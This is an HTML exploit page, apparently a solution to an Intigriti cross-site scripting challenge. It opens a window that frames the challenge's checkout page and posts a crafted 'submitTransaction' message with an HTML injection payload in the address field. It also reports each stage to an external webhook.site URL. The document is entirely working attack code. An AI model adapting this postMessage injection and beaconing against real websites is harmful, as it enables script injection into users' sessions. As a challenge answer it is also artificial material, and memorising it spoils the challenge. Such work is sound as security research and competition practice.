<!DOCTYPE html>
<html><head><title>Address XSS</title></head>
<body>
<h2>Loading...</h2>
<script>
const WEBHOOK = 'https://webhook.site/53fbb230-340b-4eba-8cf3-27641c0a00a6';
const WALLET = '16472226db03703a192aa383237035a69f';

fetch(WEBHOOK + '?s=1_START').catch(()=>{});

const blank = window.open('about:blank', '_blank');

if (blank) {
    blank.document.write(`
        <!DOCTYPE html>
        <body>
        <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
        <script>
            const WEBHOOK = '${WEBHOOK}';
            const WALLET = '${WALLET}';
            
            document.getElementById('x').onload = function() {
                fetch(WEBHOOK + '?s=2_LOADED').catch(()=>{});
                
                setTimeout(function() {
                    // Send with XSS in address field (like the successful exploit)
                    const iframe = document.getElementById('x');
                    iframe.contentWindow.postMessage({
                        type: 'submitTransaction',
                        transaction: {
                            toAddress: '<img src=x onerror="alert(\\'gigawatz\\')">',
                            currency: '1337COIN',
                            amount: 0,
                            nickname: 'xss-payload'
                        }
                    }, '*');
                    
                    fetch(WEBHOOK + '?s=3_SENT').catch(()=>{});
                }, 2000);
            };
        <\/script>
        </body>
        </html>
    `);
    blank.document.close();
}
</script>
</body>
</html>
